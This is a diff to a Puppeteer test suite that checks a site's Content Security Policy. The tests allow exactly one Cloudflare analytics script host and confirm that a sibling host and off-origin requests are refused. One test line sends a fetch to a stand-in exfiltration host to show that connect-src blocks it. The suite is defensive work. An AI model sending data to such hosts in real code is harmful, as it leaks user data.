@@ -59,6 +59,9 @@ const browser = await puppeteer.launch({
  * cannot be inherited silently — fixing the README removes this constant. */
 const KNOWN_REFUSALS = [/user-attachments.*violates.*img-src/i];
 
+/** What the real `static.cloudflareinsights.com` sends, and what a module fetch needs. */
+const CORS = { "Access-Control-Allow-Origin": "*" };
+
 const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
 const isKnown = (e) => KNOWN_REFUSALS.some((k) => k.test(e));
 
@@ -102,6 +105,21 @@ try {
        `_headers must pin script-src to 'self' (got ${JSON.stringify(csp)})`);
     ok(/(^|;\s*)connect-src\s+'self'\s*(;|$)/.test(csp),
        "connect-src stays exactly 'self' — it is what refused the port-8081 fetch");
+
+    /* THE ONE OFF-ORIGIN SCRIPT HOST, asserted by name. Cloudflare Pages injects its Web
+     * Analytics beacon into every HTML response and we cannot edit that tag, so the policy
+     * has to allow the host or log a violation on every single page load. `_headers` carries
+     * the full reasoning; this pins it so it cannot be "tidied" away silently. */
+    ok(/(^|;\s*)script-src\s[^;]*\bhttps:\/\/static\.cloudflareinsights\.com\b/.test(csp),
+       "script-src allows Cloudflare's injected analytics beacon host");
+    // ...and ONLY that one. Every other scheme-ful source in script-src would be a widening
+    // nobody argued for, and this is where it gets caught.
+    const scriptSrc = (csp.split(";").find((d) => d.trim().startsWith("script-src")) || "").trim();
+    const hosts = scriptSrc.split(/\s+/).slice(1).filter((t) => /:/.test(t) && !/^'/.test(t));
+    eq(JSON.stringify(hosts), JSON.stringify(["https://static.cloudflareinsights.com"]),
+       "…and script-src names EXACTLY that one off-origin host, no other");
+    ok(!/cloudflareinsights/.test(csp.split(";").find((d) => d.trim().startsWith("connect-src")) || ""),
+       "connect-src does NOT name it: the beacon reports to a SAME-ORIGIN /cdn-cgi/rum (see _headers)");
     for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
       ok(csp.includes(d), `_headers must carry ${d}`);
     const hsts = H["Strict-Transport-Security"] || "";
@@ -154,6 +172,90 @@ try {
     const fetched = await page.evaluate(() =>
       fetch("https://exfil.invalid.test/x", { mode: "cors" }).then(() => "sent").catch(() => "blocked"));
     eq(fetched, "blocked", "teeth: connect-src still refuses an off-origin request");
+    await page.close();
+  }
+
+  /* =====================================================================
+   * 4. THE BEACON HOST — allowed by name, and by name ONLY.
+   *
+   * Cloudflare Pages injects `<script src="https://static.cloudflareinsights.com/…">` into
+   * every HTML response. `script-src 'self'` refused it, and that refusal was on the live
+   * console of every page load — a permanent error that drowns the next real one. So the
+   * host is allowed. This block proves BOTH halves of that sentence, because an allowance
+   * nobody checks is how a policy quietly becomes a wildcard:
+   *
+   *   · a script from `static.cloudflareinsights.com` RUNS, and
+   *   · a script from the BARE `cloudflareinsights.com` — the beacon's own report host, one
+   *     label away — is still REFUSED.
+   *
+   * Both are answered at the browser, so this suite still touches no network: a CSP refusal
+   * happens BEFORE the request is issued, so a script that reaches the interceptor at all
+   * is a script the policy permitted.
+   * =================================================================== */
+  {
+    const page = await browser.newPage();
+    await page.setViewport({ width: 1440, height: 900 });
+    const errs = [];
+    page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
+    page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
+    await page.setRequestInterception(true);
+    page.on("request", (r) => {
+      if (r.isInterceptResolutionHandled()) return;
+      const u = r.url();
+      // The real host sends CORS, and it must: Pages injects the tag with
+      // `crossorigin="anonymous"` and `type="module"`, both of which make the fetch a CORS
+      // fetch. A stub without the header would fail for a reason that has nothing to do
+      // with the policy under test.
+      if (/^https:\/\/static\.cloudflareinsights\.com\//.test(u))
+        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
+                           body: "window.__beacon = 'ran';" });
+      if (/^https:\/\/cloudflareinsights\.com\//.test(u))
+        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
+                           body: "window.__sibling = 'ran';" });
+      return r.continue();
+    });
+    await page.goto(`${HOST}/sim.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
+    await new Promise((r) => setTimeout(r, 1500));
+
+    /** Add a script tag the way Pages injects the beacon, and report what happened. */
+    const inject = (src) => page.evaluate((u) => new Promise((resolve) => {
+      const s2 = document.createElement("script");
+      s2.type = "module";
+      s2.src = u;
+      s2.onload = () => resolve("loaded");
+      s2.onerror = () => resolve("refused");
+      document.head.appendChild(s2);
+      setTimeout(() => resolve("timeout"), 3000);
+    }), src);
+
+    eq(await inject("https://static.cloudflareinsights.com/beacon.min.js/vTESTONLY"), "loaded",
+       "the injected Cloudflare beacon LOADS — the console error on every page load is gone");
+    eq(await page.evaluate(() => window.__beacon || null), "ran", "…and actually executed");
+
+    eq(await inject("https://cloudflareinsights.com/beacon.min.js/vTESTONLY"), "refused",
+       "…while the BARE cloudflareinsights.com is still refused: the allowance is host-exact");
+    eq(await page.evaluate(() => window.__sibling || null), null, "…and never ran");
+    await new Promise((r) => setTimeout(r, 400));
+    // Match the URL the browser NAMES as refused, not the line: every such line also
+    // quotes the policy back, which now contains the word `static.` itself.
+    ok(cspErrors(errs).some((e) => /'https:\/\/cloudflareinsights\.com\//.test(e)),
+       "…with the refusal logged, so the policy really is the one in force");
+
+    /* The connect-src half of the same question, checked rather than assumed. The beacon
+     * reports through `navigator.sendBeacon` to the RELATIVE `/cdn-cgi/rum?…` (it only uses
+     * the absolute `https://cloudflareinsights.com/cdn-cgi/rum` when the injected tag
+     * carries no `version`, and ours carries one), so `connect-src 'self'` covers it and
+     * does not have to be widened. `sendBeacon` returns false when CSP refuses it. */
+    eq(await page.evaluate(() => navigator.sendBeacon("/cdn-cgi/rum?test", "x")), true,
+       "the beacon's SAME-ORIGIN report path is permitted by connect-src 'self' as it stands");
+    // ...and the off-origin one is still refused. Asserted with `fetch`, not `sendBeacon`:
+    // Chrome queues a beacon and returns `true` before the policy check resolves, so
+    // sendBeacon's return value is not a reliable witness for a REFUSAL (it is for the
+    // permission above, where `true` is what a queued request means).
+    eq(await page.evaluate(() =>
+         fetch("https://cloudflareinsights.com/cdn-cgi/rum", { method: "POST", body: "x" })
+           .then(() => "sent").catch(() => "blocked")), "blocked",
+       "…and an off-origin report would still be refused — connect-src keeps its teeth");
     await page.close();
   }
 } catch (e) {
